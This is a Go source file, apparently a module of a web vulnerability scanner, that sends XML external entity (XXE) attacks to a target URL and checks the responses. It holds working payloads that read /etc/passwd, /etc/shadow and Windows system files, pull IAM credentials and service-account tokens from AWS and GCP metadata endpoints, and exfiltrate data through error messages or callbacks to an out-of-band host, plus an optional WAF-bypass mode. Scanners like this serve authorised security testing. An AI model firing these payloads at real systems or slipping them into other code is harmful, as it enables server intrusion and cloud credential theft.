package main

import (
	"context"
	"fmt"
	"regexp"
	"strings"
	"time"
)

// ─── XXE Payloads ─────────────────────────────────────────────────────────────
type XXEPayload struct {
	Name string
	XML  string
	Type string
}

func xxePayloadList() []XXEPayload {
	return []XXEPayload{
		{
			Name: "Linux passwd",
			Type: "In-band File Read",
			XML: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>`,
		},
		{
			Name: "Linux shadow",
			Type: "In-band File Read",
			XML: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]>
<root><data>&xxe;</data></root>`,
		},
		{
			Name: "Windows hosts",
			Type: "In-band File Read (Windows)",
			XML: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]>
<root><data>&xxe;</data></root>`,
		},
		{
			Name: "Windows win.ini",
			Type: "In-band File Read (Windows)",
			XML: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root><data>&xxe;</data></root>`,
		},
		{
			Name: "PHP filter base64",
			Type: "PHP Filter Wrapper",
			XML: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<root><data>&xxe;</data></root>`,
		},
		{
			Name: "SSRF AWS metadata",
			Type: "SSRF via XXE",
			XML: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
<root><data>&xxe;</data></root>`,
		},
		{
			Name: "SSRF GCP metadata",
			Type: "SSRF via XXE",
			XML: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token">]>
<root><data>&xxe;</data></root>`,
		},
		{
			Name: "Error-based exfil",
			Type: "Error-based",
			XML: `<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %exfil;
]>
<root/>`,
		},
		{
			Name: "SOAP envelope",
			Type: "SOAP/In-band",
			XML: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body><data>&xxe;</data></soapenv:Body>
</soapenv:Envelope>`,
		},
		{
			Name: "SVG XXE",
			Type: "SVG Upload",
			XML: `<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
<text font-size="16" x="0" y="16">&xxe;</text></svg>`,
		},
	}
}

var xxePatterns = []*regexp.Regexp{
	regexp.MustCompile(`root:.*:0:0:`),
	regexp.MustCompile(`daemon:.*:/usr/sbin`),
	regexp.MustCompile(`\[boot loader\]`),
	regexp.MustCompile(`\[fonts\]`),
	regexp.MustCompile(`127\.0\.0\.1\s+localhost`),
	regexp.MustCompile(`ami-id|instance-id|security-credentials`),
	regexp.MustCompile(`(?i)failed to load external entity`),
	regexp.MustCompile(`(?i)no such file or directory`),
	regexp.MustCompile(`(?i)access denied`),
	// PHP filter output (base64 of /etc/passwd starts with cm9vd)
	regexp.MustCompile(`cm9vd[A-Za-z0-9+/=]{10,}`),
}

var xxeContentTypes = []string{
	"application/xml",
	"text/xml",
	"application/soap+xml",
	"image/svg+xml",
}

func (s *Scanner) scanXXE(ctx context.Context, target string) {
	req := s.requester
	waf := DetectWAF(ctx, req, target)
	if !s.cfg.Silent && waf != WAFNone {
		logWarn(fmt.Sprintf("[XXE] WAF detected: %s on %s", waf, target))
	}

	baseline := req.Baseline(ctx, target)
	payloads := xxePayloadList()

	// In-band across all content types
	for _, ct := range xxeContentTypes {
		for _, p := range payloads {
			xmlList := []string{p.XML}
			if s.cfg.WAFBypass {
				xmlList = append(xmlList, WAFVariants(p.XML)...)
			}

			for _, xml := range xmlList {
				resp, err := req.Do(ReqOpts{
					Method:      "POST",
					URL:         target,
					ContentType: ct,
					Body:        xml,
					Context:     ctx,
				})
				if err != nil {
					continue
				}

				for _, pat := range xxePatterns {
					if req.IsNewContent(baseline, resp, pat) {
						snippet := extractSnippet(resp.Body, pat)
						s.store.Add(Finding{
							URL:      target,
							Vuln:     "XXE",
							Type:     fmt.Sprintf("%s (%s)", p.Type, ct),
							Payload:  p.Name,
							Evidence: fmt.Sprintf("Pattern '%s' matched → %s", pat.String(), snippet),
							Severity: "CRITICAL",
							Request:  fmt.Sprintf("POST %s\nContent-Type: %s\n\n%s", target, ct, truncate(xml, 300)),
							Response: snippet,
						})
						break
					}
				}
			}
		}
	}

	// Multipart file upload XXE
	s.scanXXEUpload(ctx, target, baseline)

	// OOB
	if s.cfg.OOBHost != "" {
		s.scanXXEOOB(ctx, target)
	}

	// Blind time-based
	s.scanXXETimeBased(ctx, target)
}

func (s *Scanner) scanXXEUpload(ctx context.Context, target string, baseline *RespData) {
	boundary := "----GXSBoundary7MA4YWxkTrZu0gW"
	xmlContent := `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`

	body := fmt.Sprintf("--%s\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.xml\"\r\nContent-Type: application/xml\r\n\r\n%s\r\n--%s--\r\n",
		boundary, xmlContent, boundary)

	resp, err := s.requester.Do(ReqOpts{
		Method:      "POST",
		URL:         target,
		ContentType: fmt.Sprintf("multipart/form-data; boundary=%s", boundary),
		Body:        body,
		Context:     ctx,
	})
	if err != nil {
		return
	}

	for _, pat := range xxePatterns {
		if s.requester.IsNewContent(baseline, resp, pat) {
			s.store.Add(Finding{
				URL:      target,
				Vuln:     "XXE",
				Type:     "Multipart File Upload",
				Payload:  "XML file upload with entity",
				Evidence: fmt.Sprintf("Pattern '%s' in upload response", pat.String()),
				Severity: "CRITICAL",
			})
			break
		}
	}
}

func (s *Scanner) scanXXEOOB(ctx context.Context, target string) {
	oobID := randomID("xxe")
	payload := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://%s/oob/%s">]>
<root><data>&xxe;</data></root>`, s.cfg.OOBHost, oobID)

	s.requester.Do(ReqOpts{Method: "POST", URL: target, ContentType: "application/xml", Body: payload, Context: ctx})

	if hit, info := s.oob.Check(oobID, 5*time.Second); hit {
		s.store.Add(Finding{
			URL:      target,
			Vuln:     "XXE",
			Type:     "Out-of-Band (HTTP)",
			Payload:  fmt.Sprintf("OOB entity to %s/oob/%s", s.cfg.OOBHost, oobID),
			Evidence: fmt.Sprintf("Callback from %s at %s", info.RemoteAddr, info.Time.Format(time.RFC3339)),
			Severity: "CRITICAL",
		})
	}

	// OOB parameter entity
	oobID2 := randomID("xxe-pe")
	pePayload := fmt.Sprintf(`<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY %% remote SYSTEM "http://%s/oob/%s">
  %%remote;
]>
<root/>`, s.cfg.OOBHost, oobID2)

	for _, ct := range []string{"application/xml", "text/xml"} {
		s.requester.Do(ReqOpts{Method: "POST", URL: target, ContentType: ct, Body: pePayload, Context: ctx})
	}

	if hit, info := s.oob.Check(oobID2, 4*time.Second); hit {
		s.store.Add(Finding{
			URL:      target,
			Vuln:     "XXE",
			Type:     "OOB Parameter Entity",
			Payload:  fmt.Sprintf("%%remote SYSTEM http://%s/oob/%s", s.cfg.OOBHost, oobID2),
			Evidence: fmt.Sprintf("Callback from %s", info.RemoteAddr),
			Severity: "CRITICAL",
		})
	}
}

func (s *Scanner) scanXXETimeBased(ctx context.Context, target string) {
	// Use non-routable IP to force connection timeout
	slowPayload := `<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://10.255.255.1:80/">]>
<root><data>&xxe;</data></root>`

	start := nowMs()
	s.requester.Do(ReqOpts{Method: "POST", URL: target, ContentType: "application/xml", Body: slowPayload, Context: ctx})
	elapsed := nowMs() - start

	if elapsed > 7000 {
		s.store.Add(Finding{
			URL:      target,
			Vuln:     "XXE",
			Type:     "Blind Time-based (SSRF)",
			Payload:  "SYSTEM http://10.255.255.1:80/",
			Evidence: fmt.Sprintf("Connection attempt to non-routable IP caused %dms delay", elapsed),
			Severity: "HIGH",
		})
	}
}

// ─── Helpers ──────────────────────────────────────────────────────────────────
func extractSnippet(body string, pat *regexp.Regexp) string {
	loc := pat.FindStringIndex(body)
	if loc == nil {
		return ""
	}
	start := loc[0] - 30
	if start < 0 {
		start = 0
	}
	end := loc[1] + 60
	if end > len(body) {
		end = len(body)
	}
	return strings.TrimSpace(body[start:end])
}

func nowMs() int64 {
	return time.Now().UnixNano() / int64(time.Millisecond)
}
